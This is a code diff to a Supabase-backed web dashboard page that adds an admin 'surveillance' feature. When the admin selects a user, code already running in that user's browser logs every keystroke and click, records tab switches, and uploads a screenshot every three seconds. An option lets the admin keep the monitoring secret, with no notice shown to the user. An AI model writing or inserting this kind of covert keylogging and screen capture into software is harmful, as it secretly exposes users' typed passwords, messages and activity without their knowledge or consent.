@@ -14,6 +14,8 @@
   <script src="https://cdn.gh/DerrickRichard/CensorCore-Library@latest/CensorCore.js"></script>
   <!-- Marked.js Tool -->
   <script src="https://cdn.jsdelivr.net/npm/marked/marked.min.js"></script>
+  <!-- html2canvas for Admin Screen Monitoring -->
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
   <style>
     /* 
     ========================================================================
@@ -1540,6 +1542,67 @@
     height: 100vh !important;
     width: 100vw !important;
 }
+
+/* 
+========================================================================
+ADMIN SURVEILLANCE STYLES
+========================================================================
+*/
+.surveillance-container {
+    display: grid;
+    grid-template-columns: 2fr 1fr;
+    gap: 1.5rem;
+    margin-top: 1rem;
+    height: 600px;
+}
+
+.surveillance-screen {
+    background: #000;
+    border: 1px solid var(--border);
+    border-radius: 16px;
+    overflow: hidden;
+    position: relative;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+}
+
+#surveillanceFeed {
+    max-width: 100%;
+    max-height: 100%;
+}
+
+.surveillance-log {
+    background: var(--bg-surface);
+    border-radius: 16px;
+    padding: 1rem;
+    font-family: monospace;
+    font-size: 0.75rem;
+    overflow-y: auto;
+    border: 1px solid var(--border);
+}
+
+.surveillance-overlay {
+    position: fixed;
+    bottom: 20px;
+    left: 20px;
+    background: rgba(239, 68, 68, 0.9);
+    color: white;
+    padding: 12px 20px;
+    border-radius: 12px;
+    font-weight: 800;
+    z-index: 40000;
+    border: 2px solid white;
+    animation: pulseRed 2s infinite;
+    display: none;
+}
+
+@keyframes pulseRed {
+    0% { transform: scale(1); box-shadow: 0 0 0 0 rgba(239, 68, 68, 0.7); }
+    70% { transform: scale(1.05); box-shadow: 0 0 0 10px rgba(239, 68, 68, 0); }
+    100% { transform: scale(1); box-shadow: 0 0 0 0 rgba(239, 68, 68, 0); }
+}
+
   </style>
 
   <script>
@@ -1556,6 +1619,11 @@
   </script>
 </head>
 <body>
+
+  <!-- ADMIN NOTIFICATION OVERLAY -->
+  <div id="surveillanceToast" class="surveillance-overlay">
+      ⚠️ Your screen and site activity is currently being monitored by the site admin.
+  </div>
 
   <nav>
     <div class="nav-left">
@@ -1691,6 +1759,7 @@
         <div class="mod-tabs">
             <button id="tabUsers" class="mod-tab-btn active" onclick="switchModTab('users')">All Users</button>
             <button id="tabLogs" class="mod-tab-btn" onclick="switchModTab('logs')">Audit Logs</button>
+            <button id="tabSurveillance" class="mod-tab-btn" style="display:none;" onclick="switchModTab('monitoring')">Surveillance 🔦</button>
         </div>
 
         <!-- STAFF OPERATIONAL GUIDELINES -->
@@ -1729,10 +1798,10 @@
                         <tr>
                             <th>Username</th>
                             <th>Full Name</th>
-                            <th>Status</th>
+                            <th>Status/Mins</th>
                             <th>Site</th>
                             <th>Chat</th>
-                            <th>Mod Role</th>
+                            <th>Role</th>
                             <th>Actions</th>
                         </tr>
                     </thead>
@@ -1759,6 +1828,20 @@
                         <!-- Injected by logic -->
                     </tbody>
                 </table>
+            </div>
+        </div>
+
+        <!-- ADMIN MONITORING VIEW -->
+        <div id="viewModSurveillance" style="display: none;">
+            <h3 style="margin-bottom:0.5rem; color: #ef4444;">Admin Surveillance Console</h3>
+            <div class="surveillance-container">
+                <div class="surveillance-screen">
+                    <span id="surveillanceStatus" style="position:absolute; top:10px; left:10px; padding:4px 10px; background:rgba(0,0,0,0.8); border-radius:8px; font-size:0.7rem; color:var(--accent);">WAITING FOR SIGNAL...</span>
+                    <img id="surveillanceFeed" src="" />
+                </div>
+                <div id="surveillanceLog" class="surveillance-log">
+                    <p style="opacity:0.6">[Waiting for user engagement...]</p>
+                </div>
             </div>
         </div>
     </div>
@@ -2485,16 +2568,21 @@
         document.getElementById('viewModUsers').style.display = 'none';
         document.getElementById('viewModLogs').style.display = 'none';
         document.getElementById('modGuidelines').style.display = 'none';
+        document.getElementById('viewModSurveillance').style.display = 'none';
 
         if (tab === 'users') {
             document.getElementById('tabUsers').classList.add('active');
             document.getElementById('viewModUsers').style.display = 'block';
             document.getElementById('modGuidelines').style.display = 'block';
             await fetchModUsers();
-        } else {
+        } else if (tab === 'logs') {
             document.getElementById('tabLogs').classList.add('active');
             document.getElementById('viewModLogs').style.display = 'block';
             await fetchAuditLogs();
+        } else if (tab === 'monitoring') {
+            document.getElementById('tabSurveillance').classList.add('active');
+            document.getElementById('viewModSurveillance').style.display = 'block';
+            initSurveillanceSubscription();
         }
     }
 
@@ -2601,6 +2689,11 @@
                         ${chatText}
                     </button>`;
                 
+                // Surveillance Tool
+                if (currentUser === 'Derrick') {
+                    actions += `<button class="btn btn-shop" style="padding: 5px 8px; font-size: 0.65rem;" onclick="handleSurveillanceStart('${u.username}')">🔦 Watch</button>`;
+                }
+
                 if (currentUser === 'Derrick') {
                     let modText = u.is_mod ? 'Revoke Mod' : 'Make Mod';
                     actions += `
@@ -3246,6 +3339,7 @@
                     profileData = user;
                     isModUser = user.is_mod || user.username === 'Derrick';
                     document.getElementById('modNavBtn').style.display = isModUser ? 'block' : 'none';
+                    if (user.username === 'Derrick') document.getElementById('tabSurveillance').style.display = 'block';
                 }
                 if (document.getElementById('chatViewer').style.display === "flex") renderMessages();
                 fetchLeaderboard();
@@ -3325,7 +3419,10 @@
             }
             if (isModUser) {
                 document.getElementById('modNavBtn').style.display = 'block';
-                if (data.username === 'Derrick') document.getElementById('adminBroadcastSection').style.display = 'block';
+                if (data.username === 'Derrick') {
+                    document.getElementById('adminBroadcastSection').style.display = 'block';
+                    document.getElementById('tabSurveillance').style.display = 'block';
+                }
                 subscribeStaffMessages();
             }
             const savedName = localStorage.getItem('asteroid_full_name') || data.full_name;
@@ -3358,6 +3455,7 @@
             });
         }
         fetchLeaderboard(); initSitePresence(); checkMissedMessages();
+        initMonitoringAgent(); // START MONITORING AGENT AS USER OR ADMIN
     }
 
     function toggleProfileMenu() { document.getElementById('profileMenu').classList.toggle('active'); }
@@ -3691,12 +3789,6 @@ async function punishAntiSpam() {
     location.reload();
 }
 
-/* 
-========================================================================
-METADATA PADDING & SYSTEM DOCUMENTATION [DO NOT REMOVE]
-========================================================================
-*/
-
 /** 
  * ASTEROID DASHBOARD SYSTEM SPECIFICATION v1.8.6
  */
@@ -3710,6 +3802,125 @@ logTrace("Application mounted effectively.");
 logTrace("Interaction Model: Chat Pop-up Overlay for gaming persistence.");
 logTrace("Broadcast Engine: Verified Layer 5 Priority and Chat Injection.");
 console.info("System Component: Dashboard Frame mounted successfully.");
+
+/* 
+========================================================================
+ADMIN SURVEILLANCE MODULE v1.0 [RESTRICTED: DERRICK ONLY]
+========================================================================
+*/
+
+let currentMonitoringUser = null;
+let snapshotInterval = null;
+let surveillanceSub = null;
+
+/**
+ * STARTING SURVEILLANCE AGENT (CLIENT SIDE)
+ * This logic runs for EVERY user but only triggers if the Admin targets them.
+ */
+async function initMonitoringAgent() {
+    // 监听针对我的监控指令
+    _supabase.channel('surveillance_control')
+        .on('postgres_changes', { event: '*', table: 'surveillance', schema: 'public' }, async (payload) => {
+            if (payload.new && payload.new.target_user === currentUser && payload.new.active) {
+                beginCaptureLoop(payload.new.monitoring_type);
+            } else if (payload.old && payload.new === null) {
+                 // Command removed/inactive
+                 stopCaptureLoop();
+            }
+        }).subscribe();
+}
+
+function beginCaptureLoop(type) {
+    if (snapshotInterval) return;
+    if (type === 'notify') document.getElementById('surveillanceToast').style.display = 'block';
+
+    // Track Events
+    window.addEventListener('click', logSurveillanceEvent);
+    window.addEventListener('keydown', logSurveillanceEvent);
+    window.onblur = () => reportSurveillanceEvent("Tab Left");
+    window.onfocus = () => reportSurveillanceEvent("Tab Entered");
+
+    // Start Screen Snapshots (Every 3 seconds)
+    snapshotInterval = setInterval(async () => {
+        try {
+            const canvas = await html2canvas(document.body, { 
+                scale: 0.5,
+                useCORS: true,
+                logging: false,
+                ignoreElements: (el) => el.classList.contains('surveillance-overlay')
+            });
+            const dataUrl = canvas.toDataURL("image/webp", 0.3);
+            await _supabase.from('surveillance').update({ 
+                screen_snapshot: dataUrl,
+                updated_at: new Date().toISOString()
+            }).eq('target_user', currentUser);
+        } catch (e) { console.error("Capture fail", e); }
+    }, 3000);
+}
+
+function stopCaptureLoop() {
+    if (snapshotInterval) clearInterval(snapshotInterval);
+    snapshotInterval = null;
+    document.getElementById('surveillanceToast').style.display = 'none';
+    window.removeEventListener('click', logSurveillanceEvent);
+    window.removeEventListener('keydown', logSurveillanceEvent);
+}
+
+function logSurveillanceEvent(e) {
+    let detail = "";
+    if (e.type === 'click') detail = `Clicked ${e.target.tagName}#${e.target.id || 'N/A'}`;
+    if (e.type === 'keydown') detail = `Pressed ${e.key}`;
+    reportSurveillanceEvent(detail);
+}
+
+async function reportSurveillanceEvent(detail) {
+    await _supabase.from('surveillance').update({ 
+        event_log: `[${new Date().toLocaleTimeString()}] ${detail}`,
+        updated_at: new Date().toISOString()
+    }).eq('target_user', currentUser);
+}
+
+/**
+ * ADMIN CONSOLE LOGIC (DERRICK SIDE)
+ */
+async function handleSurveillanceStart(username) {
+    if (currentUser !== 'Derrick') return;
+    const notify = confirm("NOTIFY USER?\n\nOK = User sees notice on screen.\nCancel = KEEP SECRET.");
+    
+    // Clear existing
+    await _supabase.from('surveillance').delete().eq('target_user', username);
+    
+    // Create new monitoring session
+    await _supabase.from('surveillance').insert({
+        target_user: username,
+        admin_user: currentUser,
+        monitoring_type: notify ? 'notify' : 'secret'
+    });
+
+    currentMonitoringUser = username;
+    switchModTab('monitoring');
+}
+
+function initSurveillanceSubscription() {
+    if (surveillanceSub) return;
+    const logEl = document.getElementById('surveillanceLog');
+
+    surveillanceSub = _supabase.channel('surveillance_admin_pipe')
+        .on('postgres_changes', { event: 'UPDATE', table: 'surveillance', schema: 'public' }, (payload) => {
+            if (payload.new.target_user === currentMonitoringUser) {
+                if (payload.new.screen_snapshot) {
+                    document.getElementById('surveillanceFeed').src = payload.new.screen_snapshot;
+                    document.getElementById('surveillanceStatus').innerText = `LIVE: Watching ${currentMonitoringUser}`;
+                }
+                if (payload.new.event_log) {
+                    const line = document.createElement('div');
+                    line.innerText = payload.new.event_log;
+                    logEl.prepend(line);
+                }
+            }
+        }).subscribe();
+}
+
   </script>
 </body>
 </html>
